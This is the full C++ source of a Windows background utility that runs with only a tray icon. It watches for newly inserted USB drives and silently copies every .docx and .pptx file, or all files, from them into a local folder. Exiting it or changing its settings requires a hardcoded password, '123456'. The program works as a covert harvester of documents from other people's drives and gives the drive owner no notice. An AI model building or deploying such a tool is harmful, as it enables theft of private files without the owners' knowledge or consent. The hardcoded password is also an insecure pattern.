#include <windows.h>
#include <dbt.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>

// Define constants
#define WM_TRAYICON (WM_USER + 100)
#define IDI_TRAY 1001
#define ID_M_EXIT 2001
#define ID_M_MENU 2002

#define ID_BTN_TOGGLE 3001
#define ID_BTN_SAVE   3002
#define ID_ED_PASSWORD 3003
#define ID_ED_LOG     3004
#define ID_ED_PATH    3005
#define ID_RAD_DOCS   3006
#define ID_RAD_ALL    3007

#define ID_TIMER_CHECK 4001 

// Global variables
NOTIFYICONDATAW nid; // ?? Using Unicode version
HWND hMainWnd = NULL;
HWND hMenuWnd = NULL;
bool isMonitoring = true;
std::wstring targetDir = L"C:\\USB_Backup\\"; // ?? Using wstring for paths
bool copyAllFiles = false;                 

// Track drive states to prevent duplicate scans
bool activeDrives[26] = {false};

// Function declarations
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK MenuProc(HWND, UINT, WPARAM, LPARAM);
void InitTray(HWND hwnd);
void ShowMenuWindow(HWND hwndParent);
void ScanAndCopy(char driveLetter);
void AddLog(std::wstring text); // ?? Supports Chinese text logging
bool MakeSureDirectoryPathExists(std::wstring path);
void CheckForNewDrives();

// Helper for password verification
std::string inputPassword = "";
LRESULT CALLBACK PassProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    static HWND hEdit;
    switch(msg) {
        case WM_CREATE:
            CreateWindowW(L"STATIC", L"Enter Administrator Password:", WS_CHILD | WS_VISIBLE, 20, 15, 220, 20, hwnd, NULL, NULL, NULL);
            hEdit = CreateWindowW(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_PASSWORD, 20, 40, 200, 20, hwnd, (HMENU)ID_ED_PASSWORD, NULL, NULL);
            CreateWindowW(L"BUTTON", L"OK", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON, 80, 75, 80, 25, hwnd, (HMENU)IDOK, NULL, NULL);
            break;
        case WM_COMMAND:
            if(LOWORD(wp) == IDOK) {
                char buf[32];
                GetWindowTextA(hEdit, buf, 32);
                inputPassword = buf;
                DestroyWindow(hwnd);
            }
            break;
        case WM_CLOSE:
            inputPassword = "";
            DestroyWindow(hwnd);
            break;
        default: return DefWindowProcW(hwnd, msg, wp, lp);
    }
    return 0;
}

bool CheckPassword(HWND parent) {
    inputPassword = "";
    if (parent) EnableWindow(parent, FALSE);

    HWND hPassWnd = CreateWindowExW(WS_EX_DLGMODALFRAME, L"PassWndClass", L"Authentication", WS_POPUP | WS_CAPTION | WS_SYSMENU, 
        (GetSystemMetrics(SM_CXSCREEN)-260)/2, (GetSystemMetrics(SM_CYSCREEN)-150)/2, 260, 150, parent, NULL, NULL, NULL);
    
    ShowWindow(hPassWnd, SW_SHOW);
    UpdateWindow(hPassWnd);

    MSG msg;
    while (IsWindow(hPassWnd)) {
        if (GetMessageW(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }

    if (parent) {
        EnableWindow(parent, TRUE);
        SetActiveWindow(parent);
        SetForegroundWindow(parent);
    }
    
    if(inputPassword == "123456") return true;
    if(!inputPassword.empty()) MessageBoxW(parent, L"Incorrect Password!", L"Error", MB_ICONERROR | MB_TOPMOST);
    return false;
}

// Main Function
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"USBDetectorMain";
    RegisterClassW(&wc);

    WNDCLASSW pwc = {0};
    pwc.lpfnWndProc = PassProc;
    pwc.hInstance = hInstance;
    pwc.hbrBackground = (HBRUSH)(COLOR_BTNFACE+1);
    pwc.lpszClassName = L"PassWndClass";
    RegisterClassW(&pwc);

    WNDCLASSW mwc = {0};
    mwc.lpfnWndProc = MenuProc;
    mwc.hInstance = hInstance;
    mwc.hbrBackground = (HBRUSH)(COLOR_BTNFACE+1);
    mwc.lpszClassName = L"USBDetectorMenu";
    RegisterClassW(&mwc);

    hMainWnd = CreateWindowExW(0, L"USBDetectorMain", L"USB Background Monitor", WS_POPUP, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);

    MakeSureDirectoryPathExists(targetDir);

    // Initialize current drive states
    DWORD driveMask = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (driveMask & (1 << i)) {
            activeDrives[i] = true;
        }
    }

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return msg.wParam;
}

// Check all drive letters actively
void CheckForNewDrives() {
    DWORD driveMask = GetLogicalDrives();
    for (int i = 2; i < 26; i++) { 
        bool currentlyExists = (driveMask & (1 << i)) != 0;
        
        if (currentlyExists && !activeDrives[i]) {
            char driveLetter = 'A' + i;
            wchar_t rootPath[] = { (wchar_t)driveLetter, L':', L'\\', L'\0' };
            
            if (GetDriveTypeW(rootPath) == DRIVE_REMOVABLE) {
                std::wstring logMsg = L"New removable drive detected: ";
                logMsg += (wchar_t)driveLetter;
                logMsg += L":";
                AddLog(logMsg);
                ScanAndCopy(driveLetter);
            }
        }
        activeDrives[i] = currentlyExists;
    }
}

// Main Window Procedure
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
        case WM_CREATE: {
            InitTray(hwnd);
            AddLog(L"System Started: Proactive Background Polling Enabled...");
            SetTimer(hwnd, ID_TIMER_CHECK, 2000, NULL);
            break;
        }
        case WM_TIMER:
            if (wp == ID_TIMER_CHECK && isMonitoring) {
                CheckForNewDrives();
            }
            break;
        case WM_TRAYICON:
            if (lp == WM_RBUTTONUP) { 
                POINT pt;
                GetCursorPos(&pt);
                HMENU hMenu = CreatePopupMenu();
                AppendMenuW(hMenu, MF_STRING, ID_M_MENU, L"Control Panel");
                AppendMenuW(hMenu, MF_STRING, ID_M_EXIT, L"Exit Program");
                SetForegroundWindow(hwnd);
                int cmd = TrackPopupMenu(hMenu, TPM_RETURNCMD | TPM_NONOTIFY, pt.x, pt.y, 0, hwnd, NULL);
                DestroyMenu(hMenu);

                if (cmd == ID_M_EXIT) {
                    if (CheckPassword(hwnd)) {
                        KillTimer(hwnd, ID_TIMER_CHECK);
                        Shell_NotifyIconW(NIM_DELETE, &nid);
                        PostQuitMessage(0);
                    }
                } else if (cmd == ID_M_MENU) {
                    if (CheckPassword(hwnd)) {
                        ShowMenuWindow(hwnd);
                    }
                }
            }
            break;
        case WM_DESTROY:
            KillTimer(hwnd, ID_TIMER_CHECK);
            Shell_NotifyIconW(NIM_DELETE, &nid);
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProcW(hwnd, msg, wp, lp);
    }
    return 0;
}

// Initialize System Tray
void InitTray(HWND hwnd) {
    nid.cbSize = sizeof(NOTIFYICONDATAW);
    nid.hWnd = hwnd;
    nid.uID = IDI_TRAY;
    nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    nid.uCallbackMessage = WM_TRAYICON;
    nid.hIcon = LoadIcon(NULL, IDI_APPLICATION); 
    wcsncpy(nid.szTip, L"USB Detector Tool By Carlos", 128);
    Shell_NotifyIconW(NIM_ADD, &nid);
}

// Show UI Menu Window
HWND hLogEdit, hStatusStatic, hToggleBtn, hPathEdit, hSaveBtn;
HWND hRadDocs, hRadAll;

void ShowMenuWindow(HWND hwndParent) {
    if (hMenuWnd != NULL && IsWindow(hMenuWnd)) {
        ShowWindow(hMenuWnd, SW_SHOWNORMAL);
        SetForegroundWindow(hMenuWnd);
        return;
    }

    hMenuWnd = CreateWindowExW(0, L"USBDetectorMenu", L"Control Panel - By Carlos", 
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        (GetSystemMetrics(SM_CXSCREEN)-520)/2, (GetSystemMetrics(SM_CYSCREEN)-460)/2, 
        520, 460, NULL, NULL, NULL, NULL);

    hStatusStatic = CreateWindowW(L"STATIC", isMonitoring ? L"Status: Monitoring..." : L"Status: Stopped", 
        WS_CHILD | WS_VISIBLE, 20, 20, 250, 20, hMenuWnd, NULL, NULL, NULL);

    hToggleBtn = CreateWindowW(L"BUTTON", isMonitoring ? L"Stop Monitor" : L"Start Monitor", 
        WS_CHILD | WS_VISIBLE, 370, 15, 110, 30, hMenuWnd, (HMENU)ID_BTN_TOGGLE, NULL, NULL);

    CreateWindowW(L"STATIC", L"Target Backup Path:", WS_CHILD | WS_VISIBLE, 20, 60, 150, 20, hMenuWnd, NULL, NULL, NULL);
    hPathEdit = CreateWindowW(L"EDIT", targetDir.c_str(), WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 160, 58, 230, 22, hMenuWnd, (HMENU)ID_ED_PATH, NULL, NULL);
    hSaveBtn = CreateWindowW(L"BUTTON", L"Save", WS_CHILD | WS_VISIBLE, 400, 56, 80, 25, hMenuWnd, (HMENU)ID_BTN_SAVE, NULL, NULL);

    CreateWindowW(L"STATIC", L"File Type Mode:", WS_CHILD | WS_VISIBLE, 20, 95, 120, 20, hMenuWnd, NULL, NULL, NULL);
    
    hRadDocs = CreateWindowW(L"BUTTON", L"pptx_docx files", WS_CHILD | WS_VISIBLE | BS_AUTORADIOBUTTON | WS_GROUP, 160, 93, 140, 20, hMenuWnd, (HMENU)ID_RAD_DOCS, NULL, NULL);
    hRadAll  = CreateWindowW(L"BUTTON", L"All files (*.*)", WS_CHILD | WS_VISIBLE | BS_AUTORADIOBUTTON, 310, 93, 140, 20, hMenuWnd, (HMENU)ID_RAD_ALL, NULL, NULL);
    
    SendMessage(copyAllFiles ? hRadAll : hRadDocs, BM_SETCHECK, BST_CHECKED, 0);

    CreateWindowW(L"STATIC", L"Operation Log:", WS_CHILD | WS_VISIBLE, 20, 130, 200, 20, hMenuWnd, NULL, NULL, NULL);
    hLogEdit = CreateWindowW(L"EDIT", L"", 
        WS_CHILD | WS_VISIBLE | WS_BORDER | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY, 20, 155, 460, 220, hMenuWnd, (HMENU)ID_ED_LOG, NULL, NULL);

    CreateWindowW(L"STATIC", L"Author: By Carlos", WS_CHILD | WS_VISIBLE | SS_RIGHT, 360, 385, 120, 20, hMenuWnd, NULL, NULL, NULL);

    AddLog(L""); 

    ShowWindow(hMenuWnd, SW_SHOW);
    UpdateWindow(hMenuWnd);
}

// Logger Function (Unicode version)
std::wstring globalLogs = L""; 
void AddLog(std::wstring text) {
    if(!text.empty()) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        wchar_t timeBuf[30];
        wsprintfW(timeBuf, L"[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
        globalLogs += std::wstring(timeBuf) + text + L"\r\n";
    }
    if (hMenuWnd && IsWindow(hMenuWnd)) {
        SetWindowTextW(hLogEdit, globalLogs.c_str());
        SendMessage(hLogEdit, EM_SETSEL, 0, -1);
        SendMessage(hLogEdit, EM_SETSEL, -1, -1);
        SendMessage(hLogEdit, EM_SCROLLCARET, 0, 0);
    }
}

// Helper to create directory recursively (Unicode version)
bool MakeSureDirectoryPathExists(std::wstring path) {
    if (path.empty()) return false;
    if (path[path.length() - 1] != L'\\') path += L'\\';

    size_t pos = 0;
    while ((pos = path.find(L"\\", pos)) != std::wstring::npos) {
        std::wstring subPath = path.substr(0, pos);
        if (!subPath.empty() && subPath[subPath.length() - 1] != L':') {
            CreateDirectoryW(subPath.c_str(), NULL);
        }
        pos++;
    }
    return true;
}

// Menu Window Procedure
LRESULT CALLBACK MenuProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
        case WM_COMMAND:
            if (LOWORD(wp) == ID_BTN_TOGGLE) {
                isMonitoring = !isMonitoring;
                if (isMonitoring) {
                    SetWindowTextW(hStatusStatic, L"Status: Monitoring...");
                    SetWindowTextW(hToggleBtn, L"Stop Monitor");
                    AddLog(L"User Action: Enabled monitoring service.");
                } else {
                    SetWindowTextW(hStatusStatic, L"Status: Stopped");
                    SetWindowTextW(hToggleBtn, L"Start Monitor");
                    AddLog(L"User Action: Paused monitoring service.");
                }
            }
            if (LOWORD(wp) == ID_BTN_SAVE) {
                wchar_t buf[MAX_PATH];
                GetWindowTextW(hPathEdit, buf, MAX_PATH);
                std::wstring tempPath = buf;
                
                if (!tempPath.empty()) {
                    if (tempPath[tempPath.length() - 1] != L'\\') {
                        tempPath += L"\\";
                    }
                    targetDir = tempPath;
                    AddLog(L"Settings Saved: Target path updated to: " + targetDir);
                    MessageBoxW(hwnd, L"Backup path updated successfully!", L"Success", MB_ICONINFORMATION);
                } else {
                    MessageBoxW(hwnd, L"Path cannot be empty!", L"Warning", MB_ICONWARNING);
                }
            }
            if (LOWORD(wp) == ID_RAD_DOCS) {
                copyAllFiles = false;
                AddLog(L"Mode Changed: Only copying .docx & .pptx files.");
            }
            if (LOWORD(wp) == ID_RAD_ALL) {
                copyAllFiles = true;
                AddLog(L"Mode Changed: Copying ALL files (*.*).");
            }
            break;
        case WM_CLOSE:
            DestroyWindow(hwnd);
            hMenuWnd = NULL;
            break;
        default:
            return DefWindowProcW(hwnd, msg, wp, lp);
    }
    return 0;
}

// ?? [UNICODE FIXED] Handles Chinese characters in file paths flawlessly
void SearchFiles(std::wstring path) {
    std::wstring searchPath = path + L"\\*";
    WIN32_FIND_DATAW ffd; // Using Wide-char Find Data
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &ffd);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        std::wstring name = ffd.cFileName;
        if (name == L"." || name == L"..") continue;

        std::wstring fullPath = path + L"\\" + name;

        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            SearchFiles(fullPath); 
        } else {
            bool shouldCopy = false;

            if (copyAllFiles) {
                shouldCopy = true; 
            } else {
                size_t dotPos = name.find_last_of(L'.');
                if (dotPos != std::wstring::npos) {
                    std::wstring ext = name.substr(dotPos);
                    // Convert extension to lowercase
                    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                    if (ext == L".docx" || ext == L".pptx") {
                        shouldCopy = true;
                    }
                }
            }

            if (shouldCopy) {
                std::wstring destPath = targetDir + name;
                if (CopyFileW(fullPath.c_str(), destPath.c_str(), FALSE)) {
                    AddLog(L"Copied: " + name);
                } else {
                    AddLog(L"Failed to copy: " + name);
                }
            }
        }
    } while (FindNextFileW(hFind, &ffd) != 0);

    FindClose(hFind);
}

void ScanAndCopy(char driveLetter) {
    MakeSureDirectoryPathExists(targetDir);

    wchar_t driveStr[] = { (wchar_t)driveLetter, L':', L'\0' };
    std::wstring rootPath = driveStr;

    if (copyAllFiles) {
        AddLog(L"Scanning " + rootPath + L" for ALL files (including subfolders)...");
    } else {
        AddLog(L"Scanning " + rootPath + L" for .docx and .pptx files (including subfolders)...");
    }
    
    SearchFiles(rootPath);
    AddLog(L"Task completed for drive " + rootPath + L":");
}
